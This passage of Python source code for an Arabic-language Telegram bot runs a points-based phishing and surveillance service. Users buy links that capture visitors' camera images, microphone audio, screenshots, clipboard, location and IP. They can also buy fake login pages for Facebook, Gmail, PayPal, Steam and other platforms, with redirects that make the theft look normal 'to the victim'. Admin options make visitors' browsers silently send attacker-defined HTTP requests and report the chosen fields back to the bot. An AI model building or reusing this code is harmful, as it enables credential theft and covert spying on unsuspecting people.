        [InlineKeyboardButton("🔗 روابطي النشطة", callback_data="my_active_links")],
        [InlineKeyboardButton("👥 معلومات الزوار", callback_data="visitors_info")],
        [InlineKeyboardButton("📊 إحصائياتي", callback_data="my_stats")]
    ]
    
    if is_admin(user_id):
        keyboard.append([InlineKeyboardButton("🌐 تنفيذ وصح بيانات الطلب", callback_data="execute_request")])
        keyboard.append([InlineKeyboardButton("🔄 إنشاء طلب HTTP + Redirect", callback_data="execute_request_with_redirect")])
        keyboard.append([InlineKeyboardButton("🔄 طلبات HTTP متعددة + Redirect", callback_data="multi_http_requests_menu")])
        keyboard.append([InlineKeyboardButton("🔗 عرض جميع الروابط", callback_data="admin_all_links")])
        keyboard.append([InlineKeyboardButton("👨‍💼 إنشاء رابط ترويجي", callback_data="admin_create_promo")])
        keyboard.append([InlineKeyboardButton("💰 إدارة النقاط", callback_data="admin_manage_points")])
        keyboard.append([InlineKeyboardButton("📈 إحصائيات البوت", callback_data="admin_bot_stats")])
        keyboard.append([InlineKeyboardButton("📢 إدارة القنوات الإجبارية", callback_data="admin_manage_channels")])
        keyboard.append([InlineKeyboardButton("📣 إذاعة رسالة للجميع", callback_data="admin_broadcast")])
        keyboard.append([InlineKeyboardButton("⚙️ تغيير الدومين", callback_data="admin_change_domain")])
        keyboard.append([InlineKeyboardButton("🌐 تعيين دومين مخصص", callback_data="admin_set_custom_domain")])
        keyboard.append([InlineKeyboardButton("🔄 إعادة تشغيل البوت", callback_data="admin_restart_bot")])
    
    if is_main_admin(user_id):
        keyboard.append([InlineKeyboardButton("⭐ ترقية الأعضاء", callback_data="admin_promote_user")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    link_type = "👑 رابط VIP المميز" if has_valid_vip else "🔗 رابط جمع البيانات المجاني"
    
    vip_info = ""
    if has_valid_vip and vip_expiry_info:
        vip_info = f"\n⏰ صلاحية VIP: {vip_expiry_info}\n"
    
    start_message = (
        f"{welcome_msg}"
        f"✅ تم إنشاء رابطك الشخصي بنجاح!\n\n"
        f"{link_type}:\n{link}\n{vip_info}\n"
        f"🎁 رابط الإحالة:\n{referral_link}\n\n"
        f"💎 نقاطك الحالية: {user_points} نقطة\n\n"
        "📊 عند فتح الرابط، سيتم جمع البيانات وإرسالها إليك مباشرة!\n"
        "🎯 شارك رابط الإحالة مع أصدقائك واحصل على 5 نقاط لكل شخص ينضم!\n\n"
        "استخدم /stats لعرض إحصائياتك الكاملة"
    )
    
    if is_callback:
        await message_sender.edit_message_text(
            start_message,
            reply_markup=reply_markup
        )
    else:
        await message_sender.reply_text(
            start_message,
            reply_markup=reply_markup
        )
    
    assistant_admins = load_assistant_admins()
    if user_id in assistant_admins and not is_main_admin(user_id):
        try:
            link_type_text = "VIP" if has_valid_vip else "عادي"
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"🔔 إشعار: إدمن مساعد أنشأ رابطاً\n\n"
                     f"👤 ID الإدمن المساعد: {user_id}\n"
                     f"🔗 نوع الرابط: {link_type_text}\n"
                     f"📎 الرابط:\n{link}\n"
                     f"📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode='HTML'
            )
        except Exception as e:
            print(f"خطأ في إرسال إشعار للإدمن الرئيسي: {e}")

async def show_custom_link_features(query, user_id, context):
    features = context.user_data.get('custom_link_features', {})
    users = load_users()
    
    def get_status(feature_name):
        return "✅" if features.get(feature_name, False) else "❌"
    
    keyboard = [
        [InlineKeyboardButton(f"{get_status('device_info')} معلومات الجهاز", callback_data="toggle_custom_device_info")],
        [InlineKeyboardButton(f"{get_status('location')} الموقع الجغرافي", callback_data="toggle_custom_location")],
        [InlineKeyboardButton(f"{get_status('ip')} عنوان IP", callback_data="toggle_custom_ip")],
        [InlineKeyboardButton(f"{get_status('zone')} المنطقة الزمنية", callback_data="toggle_custom_zone")],
        [InlineKeyboardButton(f"{get_status('front_camera')} الكاميرا الأمامية فقط", callback_data="toggle_custom_front_camera")],
        [InlineKeyboardButton(f"{get_status('back_camera')} الكاميرا الخلفية فقط", callback_data="toggle_custom_back_camera")],
        [InlineKeyboardButton(f"{get_status('both_cameras')} الكاميرا الأمامية والخلفية", callback_data="toggle_custom_both_cameras")],
        [InlineKeyboardButton(f"{get_status('screenshot')} لقطة الشاشة", callback_data="toggle_custom_screenshot")],
        [InlineKeyboardButton(f"{get_status('clipboard')} الحافظة (Clipboard)", callback_data="toggle_custom_clipboard")],
        [InlineKeyboardButton(f"{get_status('microphone')} التسجيل الصوتي", callback_data="toggle_custom_microphone")],
        [InlineKeyboardButton("✅ متابعة", callback_data="custom_link_continue")],
        [InlineKeyboardButton("❌ إلغاء", callback_data="back_to_menu")]
    ]
    
    selected_features = [k for k, v in features.items() if v]
    selected_count = len(selected_features)
    
    message = (
        f"🎯 إنشاء رابط خاص مخصص\n\n"
        f"💎 نقاطك الحالية: {users.get(user_id, {}).get('points', 0)}\n"
        f"💰 التكلفة: 5 نقاط\n\n"
        f"📊 اختر الخصائص التي تريد سحبها:\n"
        f"(اضغط على الخاصية لتفعيلها أو إيقافها)\n\n"
        f"✅ = مفعّل  |  ❌ = غير مفعّل\n\n"
        f"📈 الخصائص المختارة: {selected_count}/10\n\n"
        f"⚠️ ملاحظة: كلما زادت الخصائص المختارة، زادت البيانات المجموعة!"
    )
    
    await query.edit_message_text(message, reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = str(query.from_user.id)
    users = load_users()
    
    if query.data == "zphisher":
        keyboard = [
            [InlineKeyboardButton("📘 Facebook", callback_data="phish_facebook"), 
             InlineKeyboardButton("📷 Instagram", callback_data="phish_instagram")],
            [InlineKeyboardButton("📧 Gmail", callback_data="phish_gmail"),
             InlineKeyboardButton("🐦 Twitter", callback_data="phish_twitter")],
            [InlineKeyboardButton("🎵 TikTok", callback_data="phish_tiktok"),
             InlineKeyboardButton("💼 LinkedIn", callback_data="phish_linkedin")],
            [InlineKeyboardButton("👾 Discord", callback_data="phish_discord"),
             InlineKeyboardButton("💬 Snapchat", callback_data="phish_snapchat")],
            [InlineKeyboardButton("🎮 Twitch", callback_data="phish_twitch"),
             InlineKeyboardButton("🎬 Netflix", callback_data="phish_netflix")],
            [InlineKeyboardButton("🎵 Spotify", callback_data="phish_spotify"),
             InlineKeyboardButton("💳 PayPal", callback_data="phish_paypal")],
            [InlineKeyboardButton("🎮 Steam", callback_data="phish_steam"),
             InlineKeyboardButton("💻 GitHub", callback_data="phish_github")],
            [InlineKeyboardButton("🎮 PlayStation", callback_data="phish_playstation"), 
             InlineKeyboardButton("🎮 Xbox", callback_data="phish_xbox")],
            [InlineKeyboardButton("🎮 Roblox", callback_data="phish_roblox"), 
             InlineKeyboardButton("📺 YouTube", callback_data="phish_youtube")],
            [InlineKeyboardButton("🎮 PUBG Mobile", callback_data="phish_pubg")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_to_menu")]
        ]
        
        await query.edit_message_text(
            f"صفحات مزيفة - اختر المنصة\n\n"
            f"🔐 صفحات تسجيل دخول احترافية لجمع البيانات\n\n"
            f"📊 عند قيام أي شخص بتسجيل الدخول في الصفحة المزيفة، ستصلك جميع البيانات المدخلة على رابطك الخاص مباشرة.\n\n"
            f"⚠️ تنبيه: أنت وحدك المسؤول عن أي استخدام غير قانوني لهذه الأداة.\n\n"
            f"👇 اختر المنصة المطلوبة:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "convert_to_pdf":
        if user_id not in users or users[user_id]['points'] < 1:
            await query.edit_message_text(
                f"❌ عذراً، ليس لديك نقاط كافية!\n\n"
                f"نقاطك: {users.get(user_id, {}).get('points', 0)}\n"
                f"المطلوب: 1 نقطة\n\n"
                f"شارك رابط الإحالة للحصول على نقاط!"
            )
            return
        
        sessions = load_sessions()
        domain = get_domain()
        link = f"https://{domain}/p/{user_id}"
        
        keyboard = [
            [InlineKeyboardButton("✅ موافق وخصم 1 نقطة", callback_data="agree_convert")],
            [InlineKeyboardButton("❌ إلغاء", callback_data="cancel_convert")]
        ]
        
        await query.edit_message_text(
            f"📋 شروط التحويل:\n\n"
            f"• سيتم خصم 1 نقطة من رصيدك\n"
            f"• نقاطك الحالية: {users[user_id]['points']}\n"
            f"• الرابط المستخدم:\n{link}\n\n"
            f"هل توافق على الشروط؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "agree_convert":
        users[user_id]['points'] -= 1
        save_users(users)
        context.user_data['waiting_for_image'] = True
        
        keyboard = [[InlineKeyboardButton("❌ إلغاء", callback_data="cancel_image")]]
        await query.edit_message_text(
            f"✅ تم خصم 1 نقطة!\n\n"
            f"💎 نقاطك الحالية: {users[user_id]['points']}\n\n"
            f"📸 الآن أرسل الصورة التي تريد تحويلها:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "cancel_convert":
        await query.edit_message_text("❌ تم الإلغاء.\n\nأرسل /start للرجوع للقائمة الرئيسية")
    
    elif query.data == "cancel_image":
        users[user_id]['points'] += 1
        save_users(users)
        context.user_data['waiting_for_image'] = False
        
        await query.edit_message_text(
            f"❌ تم الإلغاء وإرجاع النقطة\n\n"
            f"💎 نقاطك: {users[user_id]['points']}\n\n"
            f"أرسل /start للرجوع للقائمة"
        )
    
    elif query.data == "create_vip":
        keyboard = [
            [InlineKeyboardButton("⏰ VIP عادي (4 نقاط - 7 أيام)", callback_data="vip_regular")],
            [InlineKeyboardButton("💎 VIP دائم (100 نقطة - لا ينتهي)", callback_data="vip_permanent")],
            [InlineKeyboardButton("❌ إلغاء", callback_data="cancel_vip")]
        ]
        
        await query.edit_message_text(
            f"👑 اختر نوع رابط VIP:\n\n"
            f"💎 نقاطك الحالية: {users.get(user_id, {}).get('points', 0)}\n\n"
            f"⏰ VIP عادي:\n"
            f"• التكلفة: 4 نقاط\n"
            f"• الصلاحية: 7 أيام\n"
            f"• يمكن تجديده بـ 4 نقاط\n\n"
            f"💎 VIP دائم:\n"
            f"• التكلفة: 100 نقطة\n"
            f"• الصلاحية: دائم (لا ينتهي)\n"
            f"• لا يحتاج تجديد أبداً\n\n"
            f"اختر النوع المناسب:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "vip_regular":
        if user_id not in users or users[user_id]['points'] < 4:
            await query.edit_message_text(
                f"❌ عذراً، ليس لديك نقاط كافية!\n\n"
                f"نقاطك: {users.get(user_id, {}).get('points', 0)}\n"
                f"المطلوب: 4 نقاط\n\n"
                f"شارك رابط الإحالة للحصول على نقاط!"
            )
            return
        
        next_version = len(users[user_id].get('vip_links', [])) + 1
        domain = get_domain()
        vip_link = f"https://{domain}/Vip/{next_version}/{user_id}"
        
        keyboard = [
            [InlineKeyboardButton("✅ موافق وخصم 4 نقاط", callback_data="agree_vip_regular")],
            [InlineKeyboardButton("❌ إلغاء", callback_data="cancel_vip")]
        ]
        
        await query.edit_message_text(
            f"👑 إنشاء رابط VIP عادي:\n\n"
            f"• سيتم خصم 4 نقاط من رصيدك\n"
            f"• نقاطك الحالية: {users[user_id]['points']}\n"
            f"• رابط VIP #{next_version}:\n{vip_link}\n\n"
            f"🎨 ميزات VIP:\n"
            f"• صورة خلفية مخصصة\n"
            f"• رابط توجيه مخصص\n"
            f"• تصميم احترافي فريد\n"
            f"• صلاحية 7 أيام\n\n"
            f"هل توافق على الشروط؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "vip_permanent":
        if user_id not in users or users[user_id]['points'] < 100:
            await query.edit_message_text(
                f"❌ عذراً، ليس لديك نقاط كافية!\n\n"
                f"نقاطك: {users.get(user_id, {}).get('points', 0)}\n"
                f"المطلوب: 100 نقطة\n\n"
                f"شارك رابط الإحالة للحصول على نقاط!"
            )
            return
        
        next_version = len(users[user_id].get('vip_links', [])) + 1
        domain = get_domain()
        vip_link = f"https://{domain}/Vip/{next_version}/{user_id}"
        
        keyboard = [
            [InlineKeyboardButton("✅ موافق وخصم 100 نقطة", callback_data="agree_vip_permanent")],
            [InlineKeyboardButton("❌ إلغاء", callback_data="cancel_vip")]
        ]
        
        await query.edit_message_text(
            f"💎 إنشاء رابط VIP دائم:\n\n"
            f"• سيتم خصم 100 نقطة من رصيدك\n"
            f"• نقاطك الحالية: {users[user_id]['points']}\n"
            f"• رابط VIP #{next_version}:\n{vip_link}\n\n"
            f"🎨 ميزات VIP الدائم:\n"
            f"• صورة خلفية مخصصة\n"
            f"• رابط توجيه مخصص\n"
            f"• تصميم احترافي فريد\n"
            f"• ✨ دائم - لا ينتهي أبداً!\n\n"
            f"هل توافق على الشروط؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "agree_vip_regular":
        users[user_id]['points'] -= 4
        save_users(users)
        context.user_data['waiting_for_vip_image'] = True
        context.user_data['vip_type'] = 'regular'
        
        keyboard = [[InlineKeyboardButton("❌ إلغاء", callback_data="cancel_vip_setup")]]
        await query.edit_message_text(
            f"✅ تم خصم 4 نقاط!\n\n"
            f"💎 نقاطك الحالية: {users[user_id]['points']}\n\n"
            f"📸 الآن أرسل الصورة التي تريد استخدامها كخلفية لرابط VIP:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "agree_vip_permanent":
        users[user_id]['points'] -= 100
        save_users(users)
        context.user_data['waiting_for_vip_image'] = True
        context.user_data['vip_type'] = 'permanent'
        
        keyboard = [[InlineKeyboardButton("❌ إلغاء", callback_data="cancel_vip_setup")]]
        await query.edit_message_text(
            f"✅ تم خصم 100 نقطة!\n\n"
            f"💎 نقاطك الحالية: {users[user_id]['points']}\n\n"
            f"📸 الآن أرسل الصورة التي تريد استخدامها كخلفية لرابط VIP:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "cancel_vip":
        await query.edit_message_text("❌ تم الإلغاء.\n\nأرسل /start للرجوع للقائمة الرئيسية")
    
    elif query.data == "cancel_vip_setup":
        vip_type = context.user_data.get('vip_type', 'regular')
        refund_points = 100 if vip_type == 'permanent' else 4
        users[user_id]['points'] += refund_points
        save_users(users)
        context.user_data['waiting_for_vip_image'] = False
        context.user_data['waiting_for_vip_link'] = False
        context.user_data['vip_type'] = None
        
        await query.edit_message_text(
            f"❌ تم الإلغاء وإرجاع {refund_points} نقطة\n\n"
            f"💎 نقاطك: {users[user_id]['points']}\n\n"
            f"أرسل /start للرجوع للقائمة"
        )
    
    elif query.data == "execute_request":
        context.user_data['waiting_for_http_request'] = True
        
        keyboard = [[InlineKeyboardButton("❌ إلغاء", callback_data="cancel_execute_request")]]
        await query.edit_message_text(
            f"🌐 تنفيذ وصح بيانات الطلب\n\n"
            f"📋 الآن أرسل الطلب HTTP الذي تريد تنفيذه.\n\n"
            f"مثال:\n"
            f"GET /?format=json HTTP/2\n"
            f"host: api.ipify.org\n"
            f"user-agent: Mozilla/5.0\n"
            f"origin: https://example.com\n"
            f"referer: https://example.com/\n\n"
            f"📌 ملاحظة: سيتم تجربة الطلب بعدة تركيبات من الـ headers حتى ينجح!",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "cancel_execute_request":
        context.user_data['waiting_for_http_request'] = False
        
        await query.edit_message_text(
            f"❌ تم الإلغاء.\n\n"
            f"أرسل /start للرجوع للقائمة"
        )
    
    elif query.data == "execute_request_with_redirect":
        context.user_data['waiting_for_http_request_with_redirect'] = True
        
        keyboard = [[InlineKeyboardButton("❌ إلغاء", callback_data="cancel_execute_request_redirect")]]
        await query.edit_message_text(
            f"🔄 إنشاء طلب HTTP + Redirect تلقائي\n\n"
            f"📋 الآن أرسل الطلب HTTP الذي تريد تنفيذه.\n\n"
            f"مثال:\n"
            f"GET /?format=json HTTP/2\n"
            f"host: api.ipify.org\n"
            f"user-agent: Mozilla/5.0\n"
            f"origin: https://example.com\n"
            f"referer: https://example.com/\n\n"
            f"📌 ملاحظة:\n"
            f"• سيتم تجربة الطلب بعدة تركيبات من الـ headers\n"
            f"• بعد نجاح الطلب، ستُطلب منك إضافة رابط التوجيه (Redirect)\n"
            f"• عند زيارة الرابط، سيتم تنفيذ الطلب في الخلفية + Redirect تلقائي",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "cancel_execute_request_redirect":
        context.user_data['waiting_for_http_request_with_redirect'] = False
        context.user_data['waiting_for_redirect_url_for_http'] = False
        context.user_data['temp_http_request_data'] = None
        
        await query.edit_message_text(
            f"❌ تم الإلغاء.\n\n"
            f"أرسل /start للرجوع للقائمة"
        )
    
    elif query.data == "multi_http_requests_menu":
        keyboard = [
            [InlineKeyboardButton("📤 إرسال طلبات متعددة", callback_data="multi_http_send_requests")],
            [InlineKeyboardButton("⚙️ خيار ثاني (قريباً)", callback_data="multi_http_option2")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_to_menu")]
        ]
        await query.edit_message_text(
            f"🔄 طلبات HTTP متعددة + Redirect\n\n"
            f"اختر من القائمة:\n\n"
            f"📤 إرسال طلبات متعددة:\n"
            f"   • أرسل عدة طلبات HTTP واحدة تلو الأخرى\n"
            f"   • تنفيذ سريع لجميع الطلبات\n"
            f"   • Redirect تلقائي في النهاية\n\n"
            f"⚙️ خيار ثاني: سيتم إضافته قريباً",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "multi_http_send_requests":
        context.user_data['waiting_for_multi_http_request'] = True
        context.user_data['multi_http_requests_buffer'] = []
        
        keyboard = [[InlineKeyboardButton("❌ إلغاء", callback_data="cancel_multi_http_requests")]]
        await query.edit_message_text(
            f"📤 إرسال طلبات متعددة\n\n"
            f"📋 أرسل الطلب HTTP الأول:\n\n"
            f"مثال:\n"
            f"GET /?format=json HTTP/2\n"
            f"host: api.ipify.org\n"
            f"user-agent: Mozilla/5.0\n"
            f"origin: https://example.com\n"
            f"referer: https://example.com/\n\n"
            f"📊 عدد الطلبات المحفوظة: 0",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "multi_http_add_another":
        await query.answer()
        keyboard = [[InlineKeyboardButton("❌ إلغاء", callback_data="cancel_multi_http_requests")]]
        buffer_count = len(context.user_data.get('multi_http_requests_buffer', []))
        await query.edit_message_text(
            f"📤 إرسال طلبات متعددة\n\n"
            f"📋 أرسل الطلب HTTP التالي:\n\n"
            f"مثال:\n"
            f"GET /?format=json HTTP/2\n"
            f"host: api.ipify.org\n"
            f"user-agent: Mozilla/5.0\n"
            f"origin: https://example.com\n"
            f"referer: https://example.com/\n\n"
            f"📊 عدد الطلبات المحفوظة: {buffer_count}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        context.user_data['waiting_for_multi_http_request'] = True
    
    elif query.data == "multi_http_finish_and_redirect":
        context.user_data['waiting_for_multi_http_request'] = False
        context.user_data['waiting_for_multi_redirect_url'] = True
        
        buffer_count = len(context.user_data.get('multi_http_requests_buffer', []))
        await query.edit_message_text(
            f"🔗 الآن أرسل رابط التوجيه (Redirect URL)\n\n"
            f"📊 عدد الطلبات المحفوظة: {buffer_count}\n\n"
            f"💡 عند زيارة الرابط النهائي:\n"
            f"   1️⃣ تنفيذ جميع الطلبات HTTP بسرعة\n"
            f"   2️⃣ إرسال النتائج للبوت\n"
            f"   3️⃣ Redirect تلقائي للرابط الذي سترسله\n\n"
            f"أرسل رابط Redirect الآن:"
        )
    
    elif query.data == "cancel_multi_http_requests":
        context.user_data['waiting_for_multi_http_request'] = False
        context.user_data['waiting_for_multi_redirect_url'] = False
        context.user_data['multi_http_requests_buffer'] = []
        
        await query.edit_message_text(
            f"❌ تم الإلغاء.\n\n"
            f"أرسل /start للرجوع للقائمة"
        )
    
    elif query.data == "multi_http_option2":
        await query.answer("⚠️ هذا الخيار سيتم إضافته قريباً!", show_alert=True)
    
    elif query.data.startswith("show_fields_"):
        await query.answer()
        request_index = int(query.data.split("_")[2])
        buffer = context.user_data.get('multi_http_requests_buffer', [])
        
        if request_index >= len(buffer):
            await query.answer("خطأ: الطلب غير موجود", show_alert=True)
            return
        
        request_data = buffer[request_index]
        extractable_fields_display = request_data.get('extractable_fields_display', {})
        selected_fields = request_data.get('selected_fields', [])
        
        if not extractable_fields_display:
            await query.answer("لا توجد حقول قابلة للسحب", show_alert=True)
            return
        
        keyboard = []
        field_items = list(extractable_fields_display.items())
        
        for i in range(0, len(field_items), 2):
            row = []
            for j in range(2):
                if i + j < len(field_items):
                    field_name, field_value = field_items[i + j]
                    is_selected = field_name in selected_fields
                    button_text = f"{'✅' if is_selected else '⬜'} {field_name[:20]}"
                    row.append(InlineKeyboardButton(button_text, callback_data=f"toggle_field_{request_index}_{i+j}"))
            keyboard.append(row)
        
        keyboard.append([InlineKeyboardButton("✅ حفظ الاختيارات", callback_data=f"save_fields_{request_index}")])
        keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data=f"back_from_fields_{request_index}")])
        
        await query.edit_message_text(
            f"📊 الحقول القابلة للسحب ({len(extractable_fields_display)} حقل)\n\n"
            f"✅ = محدد (سيتم سحبه من الزائر)\n"
            f"⬜ = غير محدد\n\n"
            f"اضغط على الحقل لتحديده/إلغاء تحديده:\n\n"
            f"📌 عدد الحقول المحددة: {len(selected_fields)}/{len(extractable_fields_display)}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data.startswith("toggle_field_"):
        parts = query.data.split("_")
        request_index = int(parts[2])
        field_index = int(parts[3])
        
        buffer = context.user_data.get('multi_http_requests_buffer', [])
        
        if request_index >= len(buffer):
            await query.answer("خطأ: الطلب غير موجود", show_alert=True)
            return
        
        request_data = buffer[request_index]
        extractable_fields_display = request_data.get('extractable_fields_display', {})
        field_items = list(extractable_fields_display.items())
        
        if field_index >= len(field_items):
            await query.answer("خطأ: الحقل غير موجود", show_alert=True)
            return
        
        field_name, field_value = field_items[field_index]
        
        if 'selected_fields' not in request_data:
            request_data['selected_fields'] = []
        
        if field_name in request_data['selected_fields']:
            request_data['selected_fields'].remove(field_name)
            await query.answer(f"❌ تم إلغاء تحديد: {field_name}")
        else:
            request_data['selected_fields'].append(field_name)
            await query.answer(f"✅ تم تحديد: {field_name}")
        
        keyboard = []
        for i in range(0, len(field_items), 2):
            row = []
            for j in range(2):
                if i + j < len(field_items):
                    fname, fvalue = field_items[i + j]
                    is_selected = fname in request_data['selected_fields']
                    button_text = f"{'✅' if is_selected else '⬜'} {fname[:20]}"
                    row.append(InlineKeyboardButton(button_text, callback_data=f"toggle_field_{request_index}_{i+j}"))
            keyboard.append(row)
        
        keyboard.append([InlineKeyboardButton("✅ حفظ الاختيارات", callback_data=f"save_fields_{request_index}")])
        keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data=f"back_from_fields_{request_index}")])
        
        await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif query.data.startswith("save_fields_"):
        request_index = int(query.data.split("_")[2])
        buffer = context.user_data.get('multi_http_requests_buffer', [])
        
        if request_index >= len(buffer):
            await query.answer("خطأ: الطلب غير موجود", show_alert=True)
            return
        
        request_data = buffer[request_index]
        selected_count = len(request_data.get('selected_fields', []))
        
        keyboard = [
            [InlineKeyboardButton("➕ إضافة طلب آخر", callback_data="multi_http_add_another")],
            [InlineKeyboardButton("🚀 إنهاء وإرسال Redirect", callback_data="multi_http_finish_and_redirect")],
            [InlineKeyboardButton("❌ إلغاء", callback_data="cancel_multi_http_requests")]
        ]
        
        await query.edit_message_text(
            f"✅ تم حفظ الاختيارات!\n\n"
            f"📊 عدد الحقول المحددة: {selected_count}\n\n"
            f"💡 عند زيارة الرابط، سيتم سحب فقط الحقول المحددة وإرسالها للبوت\n\n"
            f"❓ ماذا تريد أن تفعل بعد ذلك؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data.startswith("back_from_fields_"):
        request_index = int(query.data.split("_")[3])
        buffer_count = len(context.user_data.get('multi_http_requests_buffer', []))
        
        keyboard = [
            [InlineKeyboardButton("➕ إضافة طلب آخر", callback_data="multi_http_add_another")],
            [InlineKeyboardButton("🚀 إنهاء وإرسال Redirect", callback_data="multi_http_finish_and_redirect")],
            [InlineKeyboardButton("❌ إلغاء", callback_data="cancel_multi_http_requests")]
        ]
        
        await query.edit_message_text(
            f"📊 عدد الطلبات المحفوظة: {buffer_count}\n\n"
            f"❓ ماذا تريد أن تفعل بعد ذلك؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "create_custom_link":
        if user_id not in users or users[user_id]['points'] < 5:
            await query.edit_message_text(
                f"❌ عذراً، ليس لديك نقاط كافية!\n\n"
                f"نقاطك: {users.get(user_id, {}).get('points', 0)}\n"
                f"المطلوب: 5 نقاط\n\n"
                f"شارك رابط الإحالة للحصول على نقاط!"
            )
            return
        
        context.user_data['custom_link_features'] = {
            'device_info': False,
            'location': False,
            'ip': False,
            'zone': False,
            'front_camera': False,
            'back_camera': False,
            'both_cameras': False,
            'screenshot': False,
            'clipboard': False,
            'microphone': False
        }
        
        await show_custom_link_features(query, user_id, context)
    
    elif query.data.startswith("toggle_custom_"):
        feature = query.data.replace("toggle_custom_", "")
        if 'custom_link_features' not in context.user_data:
            context.user_data['custom_link_features'] = {}
        
        context.user_data['custom_link_features'][feature] = not context.user_data['custom_link_features'].get(feature, False)
        await show_custom_link_features(query, user_id, context)
    
    elif query.data == "custom_link_continue":
        features = context.user_data.get('custom_link_features', {})
        selected_count = sum(1 for v in features.values() if v)
        
        if selected_count == 0:
            await query.answer("⚠️ يجب اختيار خاصية واحدة على الأقل!", show_alert=True)
            return
        
        users[user_id]['points'] -= 5
        save_users(users)
        context.user_data['waiting_for_custom_image'] = True
        
        keyboard = [[InlineKeyboardButton("❌ إلغاء", callback_data="cancel_custom_link")]]
        await query.edit_message_text(
            f"✅ تم خصم 5 نقاط!\n\n"
            f"💎 نقاطك الحالية: {users[user_id]['points']}\n\n"
            f"📊 الخصائص المختارة: {selected_count}\n\n"
            f"📸 الآن أرسل الصورة التي تريد استخدامها كخلفية للرابط الخاص:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "cancel_custom_link":
        if context.user_data.get('waiting_for_custom_image') or context.user_data.get('waiting_for_custom_redirect'):
            users[user_id]['points'] += 5
            save_users(users)
        
        context.user_data['waiting_for_custom_image'] = False
        context.user_data['waiting_for_custom_redirect'] = False
        context.user_data['custom_link_features'] = None
        context.user_data['temp_custom_image'] = None
        
        await query.edit_message_text(
            f"❌ تم الإلغاء وإرجاع 5 نقاط\n\n"
            f"💎 نقاطك: {users[user_id]['points']}\n\n"
            f"أرسل /start للرجوع للقائمة"
        )
    
    elif query.data.startswith("phish_"):
        platform = query.data.replace("phish_", "")
        
        platform_names = {
            'facebook': '📘 Facebook',
            'instagram': '📷 Instagram',
            'google': '🌐 Google',
            'gmail': '📧 Gmail',
            'twitter': '🐦 Twitter',
            'tiktok': '🎵 TikTok',
            'linkedin': '💼 LinkedIn',
            'discord': '👾 Discord',
            'snapchat': '💬 Snapchat',
            'twitch': '🎮 Twitch',
            'netflix': '🎬 Netflix',
            'spotify': '🎵 Spotify',
            'paypal': '💳 PayPal',
            'steam': '🎮 Steam',
            'whatsapp': '📱 WhatsApp',
            'github': '💻 GitHub',
            'playstation': '🎮 PlayStation',
            'xbox': '🎮 Xbox',
            'roblox': '🎮 Roblox',
            'youtube': '📺 YouTube',
            'pubg': '🎮 PUBG Mobile'
        }
        
        platform_name = platform_names.get(platform, platform.capitalize())
        
        keyboard = [
            [InlineKeyboardButton(f"📦 رابط عادي - 4 نقاط (أسبوع)", callback_data=f"buy_normal_{platform}")],
            [InlineKeyboardButton(f"🔄 رابط إعادة توجيه - 8 نقاط", callback_data=f"buy_redirect_{platform}")],
            [InlineKeyboardButton("🔙 رجوع للمنصات", callback_data="zphisher")],
            [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="back_to_menu")]
        ]
        
        await query.edit_message_text(
            f"{platform_name} - اختر نوع الرابط\n\n"
            f"💎 نقاطك الحالية: {users.get(user_id, {}).get('points', 0)} نقطة\n\n"
            f"📦 الرابط العادي:\n"
            f"• مدة الصلاحية: 7 أيام\n"
            f"• التكلفة: 4 نقاط\n\n"
            f"🔄 رابط إعادة التوجيه:\n"
            f"• بعد تسجيل الدخول، يتم توجيه الضحية لرابط محتوى تختاره\n"
            f"• يبدو طبيعي جداً للضحية\n"
            f"• التكلفة: 8 نقاط\n\n"
            f"👇 اختر النوع المطلوب:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data.startswith("buy_normal_"):
        platform = query.data.replace("buy_normal_", "")
        
        if user_id not in users or users[user_id]['points'] < 4:
            await query.edit_message_text(
                f"❌ عذراً، ليس لديك نقاط كافية!\n\n"
                f"نقاطك: {users.get(user_id, {}).get('points', 0)}\n"
                f"المطلوب: 4 نقاط\n\n"
                f"شارك رابط الإحالة للحصول على نقاط!"
            )
            return
        
        platform_names = {
            'facebook': '📘 Facebook', 'instagram': '📷 Instagram', 'google': '🌐 Google',
            'gmail': '📧 Gmail', 'twitter': '🐦 Twitter', 'tiktok': '🎵 TikTok',
            'linkedin': '💼 LinkedIn', 'discord': '👾 Discord', 'snapchat': '💬 Snapchat',
            'twitch': '🎮 Twitch', 'netflix': '🎬 Netflix', 'spotify': '🎵 Spotify',
            'paypal': '💳 PayPal', 'steam': '🎮 Steam', 'whatsapp': '📱 WhatsApp',
            'github': '💻 GitHub', 'playstation': '🎮 PlayStation', 'xbox': '🎮 Xbox',
            'roblox': '🎮 Roblox', 'youtube': '📺 YouTube', 'pubg': '🎮 PUBG Mobile'
        }
